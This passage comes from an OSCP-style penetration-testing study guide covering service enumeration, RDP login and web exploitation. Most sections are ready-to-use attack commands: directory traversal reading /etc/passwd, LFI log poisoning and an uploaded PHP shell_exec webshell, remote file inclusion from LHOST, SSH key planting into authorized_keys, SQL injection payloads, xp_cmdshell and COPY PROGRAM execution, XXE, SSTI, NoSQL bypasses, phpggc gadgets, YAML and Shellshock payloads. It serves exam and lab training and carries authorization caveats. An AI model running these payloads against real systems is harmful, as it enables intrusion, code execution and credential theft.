Readable source/config → credentials or application mapping. A successful write → retrieve that exact file and check its handler/privileged consumer. DAV write access by itself is not code execution. Use a harmless uniquely named probe and remove it after validation. Sources: upstream 1 · upstream 2 .

title: 9.2.0 Stage 02: Service Enumeration
text: id="stage-02-service-enumeration">9.2.0 Stage 02: Service Enumeration ← Main index | Strategy map | Study methods: Extract opportunities from services ; Map useful web behavior Quick use: Service opportunity cheatsheet · Web mapping cheatsheet Paired study stage: Stage 01 discovery and scanning . Enter with its endpoint/application queue; return when enumeration discloses a new in-scope host, listener, route or source position. Purpose: turn a confirmed service into names, files, permissions, credentials, configuration clues or a verified remote-access path. Applications may listen on nonstandard ports. Sort by the observed application behavior, not by the port label alone. Common port Service Open 21/tcp FTP FTP 22/tcp SSH SSH 23/tcp, 5900/tcp Telnet/VNC Windows and remote-access services 25, 465, 587/tcp SMTP SMTP 53/tcp, 53/udp DNS DNS 80, 443/tcp and alternates HTTP(S) HTTP and web application mapping 88/tcp/udp; 389, 636, 3268, 3269/tcp Kerberos/LDAP/Global Catalog LDAP and Kerberos 110, 143, 993, 995/tcp POP3/IMAP SMTP and mail access 111, 2049/tcp/udp RPC/NFS NFS and Unix RPC 135, 139, 445/tcp MS-RPC/SMB SMB and MS-RPC 161/udp SNMP SNMP 1433, 3306, 5432/tcp Databases Databases 1521, 6379/tcp Oracle TNS/Redis Databases and data stores 3389, 5985, 5986/tcp RDP/WinRM Windows remote access 5060/tcp/udp, 6667/tcp SIP/IRC SIP and IRC Exit condition: for each observed service, you can state the tested access context, available namespace or objects, effective read/write/execute rights, useful information recovered, decisive failure state and next action. A new identity, credential, hostname, route or access level triggers re-enumeration. Handoffs: new network graph information returns to Stage 01; new credentials trigger authenticated re-enumeration and the credential unit; web behavior enters Blocks 3-4; a credible public exploit enters Block 6; verified execution enters Block 7. Never equate a writable location with code execution. Confirm the privileged consumer, path, execution identity and trigger in the later exploitation or privilege-escalation stage. Memcached and WebDAV : cache data and WebDAV listing/write boundaries.

title: 9.3.1 RDP Access
text: id="rdp-access">9.3.1 RDP Access ← Stage index · Service validation · Next: File transfer | Strategy map | Study methods: Move to another host Purpose: use a validated identity with Remote Desktop logon rights to establish a Windows desktop and verify the resulting source position. <h2

title: 9.3.1.1 Baseline: prompt for the password
text: id="baseline-prompt-for-the-password">9.3.1.1 Baseline: prompt for the password xfreerdp3 /v:TARGET /u:USER /dynamic-resolution /cert:ignore Some Kali releases expose xfreerdp instead of xfreerdp3 ; check command -v xfreerdp3 xfreerdp and the selected binary's /help output. Decisive output: a usable desktop establishes a remote session. Open PowerShell or Command Prompt and verify whoami , hostname and ipconfig before treating commands as target-origin execution. <summary

title: 9.3.1.1.1 Variant — domain identity
text: id="variant-9-3-1-1-1">9.3.1.1.1 Variant — domain identity xfreerdp3 /v:TARGET /u:USER /d:DOMAIN /dynamic-resolution /cert:ignore Local and domain accounts with the same username are different identities. Make the intended context explicit when results differ. <summary

title: 9.3.1.1.2 Variant — authentication only
text: id="variant-9-3-1-1-2">9.3.1.1.2 Variant — authentication only xfreerdp3 /v:TARGET /u:USER /d:DOMAIN /auth-only /cert:ignore This tests authentication without opening the UI. Success does not guarantee that all session policies or desktop initialization will permit a full session. <summary

title: 9.3.1.1.3 Variant — explicit password
text: id="variant-9-3-1-1-3">9.3.1.1.3 Variant — explicit password xfreerdp3 /v:TARGET /u:USER '/p:PASSWORD' /dynamic-resolution /cert:ignore Prefer prompting because command-line passwords can enter shell history and process listings. Failure cues: a certificate warning is not a credential result. NLA/security negotiation, account context, authentication, Remote Desktop logon rights and an already occupied/restricted session can fail separately. /cert:ignore is appropriate only for the controlled lab context because it removes certificate identity validation. Next: after verifying the host and identity, enumerate groups/privileges, files, local services/listeners and routes from the new source position.

title: 9.3.2 Web File Read, Inclusion and Upload Paths
text: id="web-file-read-inclusion-and-upload-paths">9.3.2 Web File Read, Inclusion and Upload Paths ← Stage index · Web mapping · Quick sheet · Mechanics | Strategy map | Study methods: Turn application weaknesses into access Use when: a request selects, includes, downloads, previews or uploads a file. Prove read, inclusion, write and execution separately. <h2

title: 9.3.2.1 Directory traversal: prove file read
text: id="directory-traversal-prove-file-read">9.3.2.1 Directory traversal: prove file read Linux proof: curl -skG --data-urlencode 'file=../../../../../../etc/passwd' http://TARGET:PORT/PATH Windows proof: curl -skG --data-urlencode 'file=../../../../../../Windows/System32/drivers/etc/hosts' http://TARGET:PORT/PATH Decisive output: recognizable contents of the requested target file. 200 OK , a changed template or a filename reflected in an error is not proof. <summary

title: 9.3.2.1.1 Variant — traversal occurs in the URL path
text: id="variant-9-3-2-1-1">9.3.2.1.1 Variant — traversal occurs in the URL path curl -sk --path-as-is 'http://TARGET:PORT/static/../../../../etc/passwd' --path-as-is prevents curl from collapsing .. before sending the request. <summary

title: 9.3.2.1.2 Variant — basic normalization/filter tests
text: id="variant-9-3-2-1-2">9.3.2.1.2 Variant — basic normalization/filter tests ..%2f..%2f..%2fetc%2fpasswd %2e%2e/%2e%2e/%2e%2e/etc/passwd ....//....//....//etc/passwd Try these only after a plain baseline. Preserve the exact decoding layer that accepted the value. Next: use discovered user homes, application paths and configuration names to retrieve relevant source, keys or credentials. Send recovered authentication material to Block 5 with its source and identity context. <h2

title: 9.3.2.2 PHP inclusion: retrieve source
text: id="php-inclusion-retrieve-source">9.3.2.2 PHP inclusion: retrieve source curl -skG --data-urlencode 'page=php://filter/convert.base64-encode/resource=index.php' http://TARGET:PORT/index.php printf '%s' 'BASE64_DATA' | base64 -d Prerequisite: a PHP file-inclusion sink that accepts the wrapper. The encoded output must decode to target source; a normal rendered page means the wrapper did not disclose source in that context. <h2

title: 9.3.2.3 LFI to command execution through a writable/readable log
text: id="lfi-to-command-execution-through-a-writablereadable-log">9.3.2.3 LFI to command execution through a writable/readable log curl -sk -A '<?php echo shell_exec($_GET["cmd"]); ?>' http://TARGET:PORT/ curl -skG --data-urlencode 'page=/var/log/apache2/access.log' --data-urlencode 'cmd=id' http://TARGET:PORT/index.php Prerequisites: the controlled header is logged, the web identity can read the exact log, the inclusion sink evaluates PHP and the payload survives encoding. On Windows/XAMPP, investigate application-specific paths such as C:\xampp\apache\logs\access.log . Decisive output: the unique command output and target execution identity. If code appears as text, only read/inclusion is proven. <summary

title: 9.3.2.3.1 Variant — PHP data wrapper
text: id="variant-9-3-2-3-1">9.3.2.3.1 Variant — PHP data wrapper PAYLOAD=$(printf '%s' '<?php echo shell_exec($_GET["cmd"]); ?>' | base64 -w0) curl -skG --data-urlencode "page=data://text/plain;base64,$PAYLOAD" --data-urlencode 'cmd=id' http://TARGET:PORT/index.php Requires URL inclusion in the sink and PHP allow_url_include=On ; it is disabled by default in current PHP configurations. <summary

title: 9.3.2.3.2 Variant — remote file inclusion
text: id="variant-9-3-2-3-2">9.3.2.3.2 Variant — remote file inclusion python3 -m http.server TRANSFER_PORT --bind LHOST curl -skG --data-urlencode 'page=http://LHOST:TRANSFER_PORT/check.php' --data-urlencode 'cmd=id' http://TARGET:PORT/index.php Requires remote URL inclusion, a compatible interpreter and target-to- LHOST:TRANSFER_PORT reachability. An absent HTTP request is inconclusive until reachability and filtering are separated. <h2

title: 9.3.2.4 Upload: establish the primitive
text: id="upload-establish-the-primitive">9.3.2.4 Upload: establish the primitive Create and upload a benign canary: printf '%s\n' 'UPLOAD_CANARY_7F31' > probe.txt curl -sk -b cookies.txt -F 'file=@probe.txt;filename=probe.txt;type=text/plain' http://TARGET:PORT/upload Then verify the returned identifier/path and retrieve the bytes. Record separately: acceptance, server-side name, storage path, retrieval URL, response content type, filesystem write identity and whether the storage location is executable. <h2

title: 9.3.2.5 Upload: verify executable handling
text: id="upload-verify-executable-handling">9.3.2.5 Upload: verify executable handling PHP example, only after PHP handler evidence: printf '%s\n' '<?php if(isset($_GET["cmd"])){echo shell_exec($_GET["cmd"]);} ?>' > check.php curl -sk -b cookies.txt -F 'file=@check.php;filename=check.php;type=application/x-php' http://TARGET:PORT/upload curl -skG --data-urlencode 'cmd=id' http://TARGET:PORT/uploads/check.php Decisive output: target command output. A successful upload that downloads, displays source or returns inert text proves write/retrieval only. <summary

title: 9.3.2.5.1 Variants — isolate validation layers in Burp Repeater
text: id="variant-9-3-2-5-1">9.3.2.5.1 Variants — isolate validation layers in Burp Repeater Test one property at a time: bypass client-side checks by replaying the raw multipart request; filename case or alternate extension only when the observed server maps it to the interpreter; multipart Content-Type independently from filename and content; magic bytes only when server behavior shows content inspection; double extensions/trailing characters only when normalization evidence supports them; server rename and final response Content-Type . curl -sk -b cookies.txt -F 'file=@check.php;filename=check.pHP;type=image/jpeg' http://TARGET:PORT/upload Changing MIME type is a test of validation, not proof of executable handling. <h2

title: 9.3.2.6 Upload with path control
text: id="upload-with-path-control">9.3.2.6 Upload with path control First use a harmless unique filename outside the normal upload directory and verify it through a separate read/listing primitive. Do not overwrite an existing file as a detection test. <summary

title: 9.3.2.6.1 Lab-only variant — controlled SSH public-key placement
text: id="variant-9-3-2-6-1">9.3.2.6.1 Lab-only variant — controlled SSH public-key placement ssh-keygen -t ed25519 -f ./web_upload_key -N '' cp ./web_upload_key.pub ./authorized_keys curl -sk -b cookies.txt -F 'file=@authorized_keys;filename=../../../../home/USER/.ssh/authorized_keys' http://TARGET:PORT/upload ssh -i ./web_upload_key -p SSH_PORT USER@TARGET Use only in a disposable authorized lab after confirming the exact user/home, SSH service, web write identity, destination semantics and overwrite impact. Failure can mean path normalization, permission denial, SSH policy or a different user—not necessarily that upload path control is absent. <h2

title: 9.3.2.7 Exit and next action
text: id="exit-and-next-action">9.3.2.7 Exit and next action file/source/credential disclosure -> Block 5 and authenticated re-enumeration; verified web command execution -> record whoami / id , hostname and working directory, then Block 7; write without execution -> identify the privileged consumer/trigger or retain it as a chain primitive; product-specific handler/CVE requirement -> Block 6; no decisive result -> return to the web behavior map with the exact disproven context. <h2

title: 9.3.2.8 PHP include control — generate a filter chain when uploads are unavailable
text: id="php-include-control--generate-a-filter-chain-when-uploads-are-unavailable">9.3.2.8 PHP include control — generate a filter chain when uploads are unavailable Use only after confirming a PHP include / require sink accepts a fully controlled stream URI. A file-read endpoint that returns bytes without evaluating PHP is a different primitive. The required iconv/filter behavior must be present. <h3

title: 9.3.2.8.1 Generate the chain locally; copy the complete URI from its output
text: id="variant-9-3-2-8-1">9.3.2.8.1 Generate the chain locally; copy the complete URI from its output # Generate the chain locally; copy the complete URI from its output python3 php_filter_chain_generator.py --chain '<?php system("id"); ?>' <h3

title: 9.3.2.8.2 Replay the actual inclusion parameter, encoding the URI as one value
text: id="variant-9-3-2-8-2">9.3.2.8.2 Replay the actual inclusion parameter, encoding the URI as one value # Replay the actual inclusion parameter, encoding the URI as one value curl -sS -G --data-urlencode 'page=FILTER_URI' http://TARGET:PORT/PATH Read: an attributable target UID proves execution; base64-looking text alone can simply be source/file disclosure. Filter errors, URI truncation or rejected wrappers → inspect the actual PHP build, filter availability and parameter limits. Use the existing upload/log inclusion routes when their prerequisites fit; do not assume a modern %00 suffix truncates a filename. Sources: upstream 1 . <h2

title: 9.3.2.9 Image/PDF upload plus inclusion — verify the consumer
text: id="imagepdf-upload-plus-inclusion--verify-the-consumer">9.3.2.9 Image/PDF upload plus inclusion — verify the consumer Use when an accepted upload can later be read by a confirmed PHP include sink. MIME, extension and magic-byte checks only describe acceptance; they do not establish an executable handler. <h3

title: 9.3.2.9.1 Start with an existing valid test JPEG; place a small PHP effect in its metadata
text: id="variant-9-3-2-9-1">9.3.2.9.1 Start with an existing valid test JPEG; place a small PHP effect in its metadata # Start with an existing valid test JPEG; place a small PHP effect in its metadata exiftool -Comment='<?php system("id"); ?>' probe.jpg file probe.jpg <h3

title: 9.3.2.9.2 Retrieve the stored upload, then use the verified inclusion path
text: id="variant-9-3-2-9-2">9.3.2.9.2 Retrieve the stored upload, then use the verified inclusion path # Retrieve the stored upload, then use the verified inclusion path curl -i http://TARGET:PORT/uploads/STORED_FILE curl -sS -G --data-urlencode 'page=PATH/TO/STORED_FILE' http://TARGET:PORT/INCLUDE_PATH Read: downloading image bytes is storage/read access; a UID returned by the include establishes execution in that PHP process. PDF/PHP combinations have the same consumer requirement. Extension case, double extensions and Content-Type changes are separate validation tests, not a list to try blindly. Treat null-byte filenames as a legacy parser hypothesis that needs version evidence. Sources: upstream 1 · upstream 2 . <h2

title: 9.3.2.10 Sources
text: id="sources">9.3.2.10 Sources Supplied PEN-200 Ch 9.1-9.3, pp245-274; Hexdump traversal module , file inclusion , file upload ; OWASP traversal/file inclusion .

title: 9.3.3 Command and Manual SQL Injection
text: id="command-and-manual-sql-injection">9.3.3 Command and Manual SQL Injection ← Stage index · Web mapping · Quick sheet · Mechanics | Strategy map | Study methods: Turn application weaknesses into access Use when: mapped application behavior suggests attacker input reaches an operating-system command or database query. Preserve a valid baseline, change one input at a time and prove each capability separately. <h2

title: 9.3.3.1 Operating-system command injection
text: id="operating-system-command-injection">9.3.3.1 Operating-system command injection <h3

title: 9.3.3.1.1 Visible-output baseline
text: id="visible-output-baseline">9.3.3.1.1 Visible-output baseline Start with a benign identity marker appropriate to the inferred operating system: curl -skG --data-urlencode 'host=127.0.0.1;id' http://TARGET:PORT/PATH curl -skG --data-urlencode 'host=127.0.0.1&whoami' http://TARGET:PORT/PATH Decisive output: command output attributable to the target, such as a username/UID that is absent from the normal response. Reflection of the payload is not execution. <summary

title: 9.3.3.1.1.1 Variants — separators, quoting and POST bodies
text: id="variant-9-3-3-1-1-1">9.3.3.1.1.1 Variants — separators, quoting and POST bodies Test only the forms compatible with the observed command and platform: 127.0.0.1; id 127.0.0.1 && id 127.0.0.1 | id 127.0.0.1%0aid curl -sk -X POST -H 'Content-Type: application/x-www-form-urlencoded' --data-urlencode 'host=127.0.0.1;id' http://TARGET:PORT/PATH curl -sk -X POST -H 'Content-Type: application/json' -d '{"host":"127.0.0.1;id"}' http://TARGET:PORT/api/PATH For Windows command contexts, use an observed cmd.exe or PowerShell boundary before choosing syntax: 127.0.0.1 & whoami 127.0.0.1 | whoami <h3

title: 9.3.3.1.2 Blind timing proof
text: id="blind-timing-proof">9.3.3.1.2 Blind timing proof Repeat a control and a bounded-delay request several times: curl -sk -o /dev/null -w 'control=%{time_total}\n' -G --data-urlencode 'host=127.0.0.1' http://TARGET:PORT/PATH curl -sk -o /dev/null -w 'test=%{time_total}\n' -G --data-urlencode 'host=127.0.0.1;sleep 5' http://TARGET:PORT/PATH Windows candidate after platform evidence: 127.0.0.1 & timeout /t 5 Decisive output: a repeatable delay near the chosen interval relative to multiple controls. One slow response is inconclusive . <h3

title: 9.3.3.1.3 After command execution
text: id="after-command-execution">9.3.3.1.3 After command execution Linux: id; hostname; pwd Windows: whoami; hostname; cd Record the execution identity, working directory, shell/parser and egress assumptions. Hand reliable-session work to Block 7; do not treat one command response as an interactive shell. <h2

title: 9.3.3.2 Manual SQL injection workflow
text: id="manual-sql-injection-workflow">9.3.3.2 Manual SQL injection workflow Exam boundary: the current OSCP+ exam guide prohibits SQLmap and other automatic exploitation tools. The following procedure is manual. Recheck the current guide before an exam. <h3

title: 9.3.3.2.1 Establish query influence
text: id="1-establish-query-influence">9.3.3.2.1 Establish query influence Replay a valid request in Burp Repeater. Change one parameter and compare a normal value, quote, true condition and false condition: VALUE VALUE' VALUE' AND '1'='1 VALUE' AND '1'='2 For a numeric context: 1 1 AND 1=1 1 AND 1=2 Evidence: a database error, stable true/false response difference, or repeatable database-specific delay. An isolated 500 , WAF block or generic application error is not enough. <h3

title: 9.3.3.2.2 Authentication-bypass candidate
text: id="2-authentication-bypass-candidate">9.3.3.2.2 Authentication-bypass candidate In an authorized disposable lab, preserve the application's quoting and comment syntax: ' OR 1=1-- - administrator'-- - Verification: identify the resulting account/session and perform a separate authorized request. A redirect or welcome string alone can be misleading. <h3

title: 9.3.3.2.3 Determine UNION shape
text: id="3-determine-union-shape">9.3.3.2.3 Determine UNION shape First establish column count: ' ORDER BY 1-- - ' ORDER BY 2-- - ' ORDER BY 3-- - Or increment NULL columns until the query succeeds: ' UNION SELECT NULL-- - ' UNION SELECT NULL,NULL-- - ' UNION SELECT NULL,NULL,NULL-- - Then find a displayed text-compatible column: ' UNION SELECT NULL,'MARKER_7F31',NULL-- - Decisive output: the marker appears in a response location controlled by the injected row. Match the exact column count and data types. <h3

title: 9.3.3.2.4 Extract only after fingerprinting the DBMS
text: id="4-extract-only-after-fingerprinting-the-dbms">9.3.3.2.4 Extract only after fingerprinting the DBMS MySQL: ' UNION SELECT NULL,version(),NULL-- - PostgreSQL: ' UNION SELECT NULL,version(),NULL-- - MSSQL: ' UNION SELECT NULL,@@version,NULL-- - Use the confirmed DBMS's catalog and concatenation syntax rather than cycling unrelated payloads. Keep each extraction request reproducible in Repeater. <h3

title: 9.3.3.2.5 Boolean- or time-blind extraction
text: id="5-boolean--or-time-blind-extraction">9.3.3.2.5 Boolean- or time-blind extraction Choose a stable page marker or content length for true/false comparisons: ' AND SUBSTRING((SELECT version()),1,1)='P'-- - ' AND SUBSTRING((SELECT version()),1,1)='X'-- - DBMS-specific time proofs: MySQL: ' AND IF(1=1,SLEEP(5),0)-- - PostgreSQL: '; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END-- MSSQL: '; IF (1=1) WAITFOR DELAY '0:0:5'-- Repeat controls. Time-based results are invalid if application latency overlaps the chosen delay or the condition cannot be changed independently. <h2

title: 9.3.3.3 Database control to operating-system effect
text: id="database-control-to-operating-system-effect">9.3.3.3 Database control to operating-system effect This is a new transition, not an automatic consequence of SQL injection. Verify the DBMS identity, database role, feature state, filesystem permissions and path or egress assumptions first. <summary

title: 9.3.3.3.1 MSSQL — xp_cmdshell when privilege and policy allow
text: id="variant-9-3-3-3-1">9.3.3.3.1 MSSQL — xp_cmdshell when privilege and policy allow EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'whoami'; Requires sufficient server privilege; enabling it changes server configuration. Prefer a direct proof when it is already enabled. Verify the Windows service identity returned by whoami . <summary

title: 9.3.3.3.2 PostgreSQL — COPY PROGRAM when role and version allow
text: id="variant-9-3-3-3-2">9.3.3.3.2 PostgreSQL — COPY PROGRAM when role and version allow DROP TABLE IF EXISTS cmd_output; CREATE TABLE cmd_output(line text); COPY cmd_output FROM PROGRAM 'id'; SELECT * FROM cmd_output; Requires a superuser or a role such as pg_execute_server_program ; the command runs under the database service account. <summary

title: 9.3.3.3.3 MySQL/MariaDB — file write as a separate primitive
text: id="variant-9-3-3-3-3">9.3.3.3.3 MySQL/MariaDB — file write as a separate primitive SELECT '<?php echo shell_exec($_GET["cmd"]); ?>' INTO OUTFILE '/CONFIRMED/WEBROOT/check.php'; Requires FILE privilege, a permitted secure_file_priv destination, a known writable webroot and PHP execution there. Verify the file through HTTP, then verify execution. If it only displays or downloads, only file write is proven. <h2

title: 9.3.3.4 Out-of-band SQL injection boundary
text: id="out-of-band-sql-injection-boundary">9.3.3.4 Out-of-band SQL injection boundary Out-of-band testing is relevant only when direct content, errors, boolean differences and repeatable time delays cannot produce decisive evidence and the database can initiate a network request. A callback proves server/database-side resolution or connectivity; it does not by itself prove arbitrary query-result extraction. Hypothetical MySQL/Windows UNC lookup in an authorized lab: SELECT LOAD_FILE(CONCAT('\\\\LHOST\\', DATABASE())); Use a uniquely labelled controlled listener/domain and transmit no sensitive row data during proof. Required conditions include a DBMS/function that performs the lookup, sufficient database/OS permissions, working outbound DNS/SMB/HTTP as applicable and an observable callback. No callback is inconclusive until query execution and outbound reachability are separated. Avoid poisoning/spoofing; the current OSCP+ exam guide prohibits spoofing. <h2

title: 9.3.3.5 Failure-guided decisions
text: id="failure-guided-decisions">9.3.3.5 Failure-guided decisions quote causes generic error only -> compare true/false and inspect whether the application, proxy or WAF generated it; UNION always errors -> recheck context, column count, types, parentheses and comment syntax; blind pages differ randomly -> find a stable marker or repeat timing controls before continuing; command payload is reflected -> no execution proof; compare command-derived output or side effect; command executes but callback fails -> keep execution confirmed and diagnose listener, route, payload and egress separately in Block 7; database identity lacks the required role/feature -> retain data access and search extracted configuration/credentials rather than assuming OS execution. <h2

title: 9.3.3.6 Handoffs
text: id="handoffs">9.3.3.6 Handoffs extracted password/hash/key/ token -> Block 5 with source and identity context; exact vulnerable product/version or stored procedure requirement -> Block 6; verified OS command -> Block 7 session handling; file write into web content -> web file handling ; useful application account/role -> remap authenticated behavior in Block 3. <h2

title: 9.3.3.7 SSTI — prove template evaluation, then identify the engine
text: id="ssti--prove-template-evaluation-then-identify-the-engine">9.3.3.7 SSTI — prove template evaluation, then identify the engine Use when controlled text appears inside a server-rendered template, email preview or report. Replay the real parameter and session. These are separate probes, not one universal payload: <h3

title: 9.3.3.7.1 Jinja/Twig-style expression probe
text: id="variant-9-3-3-7-1">9.3.3.7.1 Jinja/Twig-style expression probe # Jinja/Twig-style expression probe curl -sS -G --data-urlencode 'name={{7*7}}' http://TARGET:PORT/PATH <h3

title: 9.3.3.7.2 A different delimiter family, only when the first is literal or errors suggest it
text: id="variant-9-3-3-7-2">9.3.3.7.2 A different delimiter family, only when the first is literal or errors suggest it # A different delimiter family, only when the first is literal or errors suggest it curl -sS -G --data-urlencode 'name=${7*7}' http://TARGET:PORT/PATH <h3

title: 9.3.3.7.3 Jinja-versus-Twig clue; interpret alongside source/errors, not in isolation
text: id="variant-9-3-3-7-3">9.3.3.7.3 Jinja-versus-Twig clue; interpret alongside source/errors, not in isolation # Jinja-versus-Twig clue; interpret alongside source/errors, not in isolation curl -sS -G --data-urlencode "name={{7*'7'}}" http://TARGET:PORT/PATH Read: changed, repeatable computed output compared with a literal control supports evaluation. 49 alone does not identify the engine. Jinja commonly repeats the string; Twig commonly treats it numerically. Confirm the engine/version and exposed objects before selecting a file-read or command primitive. Literal reflection → inspect another template/input boundary; a syntax error alone does not prove an exploitable expression. Sources: upstream 1 . <h2

title: 9.3.3.8 XXE — test the XML parser and file-read result
text: id="xxe--test-the-xml-parser-and-file-read-result">9.3.3.8 XXE — test the XML parser and file-read result Use a working XML request and put the entity reference in a field whose parsed value is returned. Retain the original wrapper, cookies and endpoint. Example body for an XML-compatible endpoint: <?xml version="1.0"?> <!DOCTYPE request [<!ENTITY probe SYSTEM "file:///etc/passwd">]> <request><value>&probe;</value></request> curl -i -b cookies.txt -H 'Content-Type: application/xml' \ --data-binary @xxe.xml http://TARGET:PORT/PATH Read: recognizable file content in the parsed field proves read access; echoing the submitted XML does not. Choose a platform-appropriate file; Windows can use file:///C:/Windows/win.ini . DTD rejection or unresolved entities → check the parser's actual configuration, not more traversal depth. If the application builds XML around your input and processes XInclude, a separate condition can exist without control over the document's DOCTYPE: <value xmlns:xi="http://www.w3.org/2001/XInclude"> <xi:include parse="text" href="file:///etc/passwd"/> </value> A blind endpoint needs an observable parser/network effect before any exfiltration claim. Follow verified config/source reads into credential or application testing. Sources: upstream 1 . <h2

title: 9.3.3.9 NoSQL operator injection — separate JSON objects from strings
text: id="nosql-operator-injection--separate-json-objects-from-strings">9.3.3.9 NoSQL operator injection — separate JSON objects from strings Use when a login/search accepts structured JSON or nested form parameters and evidence suggests a MongoDB-style query. Start with a normal failed request, then change one value's type. <h3

title: 9.3.3.9.1 A known username with an operator-valued password
text: id="variant-9-3-3-9-1">9.3.3.9.1 A known username with an operator-valued password # A known username with an operator-valued password curl -i -c cookies.txt -H 'Content-Type: application/json' \ --data '{"username":"USER","password":{"$ne":""}}' http://TARGET:PORT/LOGIN <h3

title: 9.3.3.9.2 Distinct context: a form parser that expands bracketed properties
text: id="variant-9-3-3-9-2">9.3.3.9.2 Distinct context: a form parser that expands bracketed properties # Distinct context: a form parser that expands bracketed properties curl -i -c cookies.txt --data-urlencode 'username=USER' \ --data-urlencode 'password[$ne]=x' http://TARGET:PORT/LOGIN Read: compare against the same operator encoded as a plain string and against a known wrong password. Confirm the resulting identity through a protected route. A 200/login page or changed error is not authenticated access. Type validation, hashing the supplied password before querying, or removal of $ operators can rule out this route. Broader $ne username queries may select an unexpected first account; keep the intended identity explicit. Sources: upstream 1 . <h2

title: 9.3.3.10 PHP deserialization — match the gadget to installed dependencies
text: id="php-deserialization--match-the-gadget-to-installed-dependencies">9.3.3.10 PHP deserialization — match the gadget to installed dependencies Use when a controlled serialized value reaches unsafe unserialize() and the required classes are loaded. Identify dependencies/builds from source or composer.lock first. <h3

title: 9.3.3.10.1 Inspect available families and the exact chain's version/vector requirements
text: id="variant-9-3-3-10-1">9.3.3.10.1 Inspect available families and the exact chain's version/vector requirements # Inspect available families and the exact chain's version/vector requirements phpggc -l phpggc -i Monolog/RCE1 <h3

title: 9.3.3.10.2 Example function-call gadget, only when that chain matches the application
text: id="variant-9-3-3-10-2">9.3.3.10.2 Example function-call gadget, only when that chain matches the application # Example function-call gadget, only when that chain matches the application phpggc -b Monolog/RCE1 system id > payload.b64 Read: base64 is a transport choice, not a bypass—the sink must decode it before deserialization. Preserve raw serialized lengths and binary bytes; use the encoding that the real request expects. A generated payload is not execution proof. Missing classes, rejected object types or a different dependency version → choose a matching chain or another primitive. Verify a benign effect before selecting a shell payload. Sources: upstream 1 . <h2

title: 9.3.3.11 Unsafe YAML construction — distinguish loading from safe parsing
text: id="unsafe-yaml-construction--distinguish-loading-from-safe-parsing">9.3.3.11 Unsafe YAML construction — distinguish loading from safe parsing Use when source or errors identify Python YAML processing with an unsafe loader and you control the loaded YAML. An ordinary JSON field or yaml.safe_load() does not supply this condition. !!python/object/apply:os.system ["id"] Put the probe in the actual YAML input/file, preserving its required surrounding structure. Read: attributable command output/effect supports unsafe construction. ConstructorError for the Python tag commonly indicates a loader that does not permit that constructor. Confirm the installed PyYAML version and loader ( UnsafeLoader /unsafe load), rather than assuming that any use of YAML permits Python object execution. Sources: upstream 1 . <h2

title: 9.3.3.12 SQL truncation or normalization mismatch at registration
text: id="sql-truncation-or-normalization-mismatch-at-registration">9.3.3.12 SQL truncation or normalization mismatch at registration Use when the application checks one representation for uniqueness but the DB stores or compares a different one—for example, an overlong username in a fixed-length column. Validate with a disposable account first. -- With SQL visibility, inspect the real column and strict-mode behavior SELECT @@sql_mode; SELECT COLUMN_NAME, CHARACTER_MAXIMUM_LENGTH FROM information_schema.columns WHERE table_schema = DATABASE() AND table_name = 'users'; Compare registration/login behavior for the test name, its trailing-space form and an overlong form that would truncate to it. A plus character only becomes a space in the appropriate form encoding; it is not a universal SQL payload. A strict length error or a unique constraint on the normalized stored value can stop this path. Confirm an actual account/ authorization change before calling it a bypass. Sources: upstream 1 . <h2

title: 9.3.3.13 Shellshock candidate — only for a CGI path that invokes vulnerable Bash
text: id="shellshock-candidate--only-for-a-cgi-path-that-invokes-vulnerable-bash">9.3.3.13 Shellshock candidate — only for a CGI path that invokes vulnerable Bash Use when a confirmed CGI endpoint passes HTTP-derived environment variables into an affected Bash process. An arbitrary PHP/Java route or a Bash version string alone does not establish this chain. # Bounded command-effect probe at the actual CGI script curl -i -H 'User-Agent: () { :;}; echo; /usr/bin/id' \ http://TARGET:PORT/cgi-bin/SCRIPT Read: an attributable UID in the executed CGI response supports the effect; reflection of the header text does not. Header/CGI parsing errors require inspecting the request and script behavior. No effect → re-check the actual component and patch status before selecting another PoC. This is the CVE-2014-6271 family, not a generic command separator for every web input. Sources: upstream 1 . <h2

title: 9.3.3.14 Sources
text: id="sources">9.3.3.14 Sources Supplied PEN-200 Ch 9.4 pp274-279 and Ch 10 pp285-300; reviewed getSH Web/SQLi route ; Hexdump SQL injection module ; OWASP command injection testing , OWASP SQL injection testing ; current OSCP+ exam guide .

title: 9.3.4 Web Access Control, API Logic and XSS
text: id="web-access-control-api-logic-and-xss">9.3.4 Web Access Control, API Logic and XSS ← Stage index · Web mapping · Quick sheet · Mechanics | Strategy map | Study methods: Turn application weaknesses into access Use when: the mapped application exposes object identifiers, roles/properties, privileged functions or user-controlled content rendered in a browser. <h2

title: 9.3.4.1 Object-level authorization / IDOR
text: id="object-level-authorization--idor">9.3.4.1 Object-level authorization / IDOR Use two controlled lab identities and one object owned by each: GET /api/orders/OBJECT_B HTTP/1.1 Host: DOMAIN Authorization: Bearer USER_A_TOKEN Save user A's successful request for object A. Change only the path/query/body object reference to object B. Keep A's token . Verify disclosure or the intended update/delete effect against B's object. Decisive output: data or a state change belonging to B under A's context. A different error or 200 wrapper is not enough. <h2

title: 9.3.4.2 Function- and role-level authorization
text: id="function--and-role-level-authorization">9.3.4.2 Function- and role-level authorization Replay the same operation as: anonymous -> ordinary user -> alternate ordinary user -> administrator Compare UI and API paths, then test the legitimate method variants suggested by captured traffic or documentation. curl -ski -b user-a.cookies http://TARGET:PORT/admin/PATH curl -ski -X POST -b user-a.cookies -H 'Content-Type: application/json' -d '{"action":"EXPECTED_ACTION"}' http://TARGET:PORT/api/admin/PATH Failure cue: a route name containing admin does not establish a bypass. Verify a privileged read or action under the lower-privileged identity. <h2

title: 9.3.4.3 Mass assignment / excessive properties
text: id="mass-assignment--excessive-properties">9.3.4.3 Mass assignment / excessive properties Start with a valid captured registration/update request and add one server-owned property: curl -ski -X POST -H 'Content-Type: application/json' -d '{"username":"TEST_USER","password":"TEST_PASSWORD","role":"administrator"}' http://TARGET:PORT/api/v1/register Decisive output: authenticate as the new/updated identity and perform an administrator-only action. An echoed or stored role field may be ignored by authorization logic. <summary

title: 9.3.4.3.1 Variant — method mismatch reveals a valid route
